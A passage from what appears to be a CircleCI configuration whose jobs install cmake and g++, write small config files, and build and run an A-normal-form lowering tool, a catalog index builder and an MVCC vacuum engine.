          command: |
            printf 'let x = 1 in x\n' > core.anf
      - run:
          name: Build normalizer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target anf-lower -j2
      - run:
          name: Lower to A-normal form
          command: LIONSS_LP=1 ./build/anf-lower --in core.anf
  saffronPike:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore snapshot
          command: tar xzf egg.tgz
      - run:
          name: Install native deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load catalog
          command: |
            printf 'items = 500\n' > catalog.cfg
      - run:
          name: Build index builder
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target saffronPike -j2
      - run:
          name: Index catalog
          command: LIONSS_LP=1 ./build/saffronPike --config catalog.cfg --analyzer standard
  mvccVacuum:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch sources
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Mark dead tuples
          command: |
            printf 'dead 1200\n' > mvcc.cfg
      - run:
          name: Build MVCC engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target mvccVacuum -j2
      - run:
          name: Vacuum dead versions
